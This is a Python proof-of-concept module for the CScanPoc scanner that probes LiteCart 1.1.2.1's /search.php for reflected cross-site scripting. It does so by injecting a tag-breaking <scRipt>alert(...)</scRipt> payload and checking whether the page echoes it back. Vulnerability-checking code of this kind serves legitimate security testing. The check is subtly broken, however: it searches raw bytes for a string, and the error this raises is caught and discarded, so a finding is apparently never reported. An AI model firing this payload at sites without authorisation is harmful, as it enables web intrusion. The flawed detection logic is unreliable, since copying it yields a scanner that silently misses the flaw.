# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'LiteCart_0101'  # 平台漏洞编号，留空
    name = 'LiteCart 1.1.2.1 /search.php 跨站脚本'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-11-07'  # 漏洞公布时间
    desc = '''
    Several cross-site scripting vulnerabilities where discovered in LiteCart, an open source project that allows you to create a e-commerce sites.
    '''  # 漏洞描述
    ref = 'https://www.netsparker.com/xss-vulnerabilities-in-litecart/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'LiteCart'  # 漏洞应用名称
    product_version = '1.1.2.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '86e26f49-430a-4381-8e7a-7d4f01500ba1'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '''/search.php?query='"--></style></scRipt><scRipt>alert(0x0000C0)</scRipt>'''
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if '<scRipt>alert(0x0000C0)</scRipt>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
